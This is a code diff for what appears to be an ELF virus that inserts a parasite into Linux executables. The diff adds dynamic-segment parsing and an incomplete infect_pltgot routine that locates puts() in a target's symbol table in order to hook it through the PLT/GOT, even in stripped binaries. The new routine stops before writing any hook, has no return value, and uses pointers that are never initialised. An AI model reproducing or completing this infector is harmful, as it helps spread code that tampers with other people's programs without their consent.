@@ -32,6 +32,7 @@ struct linux_dirent64 {
         char            d_name[0];
 } __attribute__((packed));
 
+	
 
 /* libc */ 
 
@@ -103,10 +104,13 @@ typedef struct elfbin {
 	Elf64_Ehdr *ehdr;
 	Elf64_Phdr *phdr;
 	Elf64_Shdr *shdr;
+	Elf64_Dyn *dyn;
 	Elf64_Addr textVaddr;
 	Elf64_Addr dataVaddr;
 	size_t textSize;
 	size_t dataSize;
+	Elf64_Off dataOff;
+	Elf64_Off textOff;
 	uint8_t *mem;
 	size_t size;
 	char *path;
@@ -400,7 +404,7 @@ int load_self(elfbin_t *elf)
 	elf->mem = (uint8_t *)_start_addr;
 	elf->size = (char *)&end_code - (char *)&_start; 
 	elf->size += (int)((char *)f2 - (char *)f1);
-	elf->size += 1024; // fixes some type of miscalculation bug :(
+	elf->size += 1024; // So we have .rodata included in parasite insertion
 	return 0;
 }
 
@@ -428,8 +432,9 @@ int load_target(const char *path, elfbin_t *elf)
 	elf->phdr = (Elf64_Phdr *)&elf->mem[elf->ehdr->e_phoff];
 	elf->shdr = (Elf64_Shdr *)&elf->mem[elf->ehdr->e_shoff];
 	for (i = 0; i < elf->ehdr->e_phnum; i++) {
-		if (elf->phdr[i].p_type == PT_LOAD)
-                	switch(!!elf->phdr[i].p_offset) {
+		switch(elf->phdr[i].p_type) {	
+			case PT_LOAD:
+				switch(!!elf->phdr[i].p_offset) {
                         	case 0:
                                 	elf->textVaddr = elf->phdr[i].p_vaddr;
                                 	elf->textSize = elf->phdr[i].p_memsz;
@@ -437,14 +442,74 @@ int load_target(const char *path, elfbin_t *elf)
                                	case 1:
                                 	elf->dataVaddr = elf->phdr[i].p_vaddr;
                                 	elf->dataSize = elf->phdr[i].p_memsz;
-                                	break;
+                                	elf->dataOff = elf->phdr[i].p_offset;
+					break;
                         }
+				break;
+			case PT_DYNAMIC:
+				elf->dyn = (Elf64_Dyn *)&elf->mem[elf->phdr[i].p_offset];
+				break;
+		}
+			
         }
 	elf->st = st;
 	elf->size = st.st_size;
 	return 0;
 }
 
+/* 
+ * We hook puts() for l33t sp34k 0utput. We parse the phdr's dynamic segment
+ * directly so we can still infect programs that are stripped of section header
+ * tables.
+ */
+int infect_pltgot(elfbin_t *target)
+{
+	int i, symindex = -1;	
+	Elf64_Sym *symtab;
+	Elf64_Rela *jmprel;
+	Elf64_Dyn *dyn = target->dyn;
+	long *pltgot;
+	char *strtab;
+	size_t strtab_size;
+
+	for (i = 0; dyn[i].d_tag != DT_NULL; i++) {
+		switch(dyn[i].d_tag) {
+			case DT_SYMTAB: // relative to the text segment base
+				symtab = (Elf64_Sym *)&target->mem[dyn[i].d_un.d_ptr - target->textVaddr];			
+				break;
+			case DT_PLTGOT: // relative to the data segment base
+				pltgot = (long *)&target->mem[target->dataOff + (dyn[i].d_un.d_ptr - target->dataVaddr)];
+				break;
+			case DT_STRTAB: // relative to the text segment base
+				strtab = (char *)&target->mem[dyn[i].d_un.d_ptr - target->textVaddr];
+				break;
+			case DT_STRSZ:
+				strtab_size = (size_t)dyn[i].d_un.d_val;
+				break;
+			case DT_JMPREL:
+				jmprel = (Elf64_Rela *)&target->mem[dyn[i].d_un.d_ptr - target->textVaddr];
+				break;
+		}
+	}
+	if (symtab == NULL || pltgot == NULL) {
+		DEBUG_PRINT("Unable to locate symtab or pltgot\n");
+		return -1;
+	}
+	
+	for (i = 0; symtab[i].st_name <= strtab_size; i++) {
+		if (!_strcmp(&strtab[symtab[i].st_name], "puts")) {
+			symindex = i;
+			break;
+		}	
+	}
+	if (symindex == -1) {
+		DEBUG_PRINT("cannot find puts()\n");
+		return -1;
+	}
+	
+	
+	
+}
 /*
  * Must be ELF
  * Must be ET_EXEC
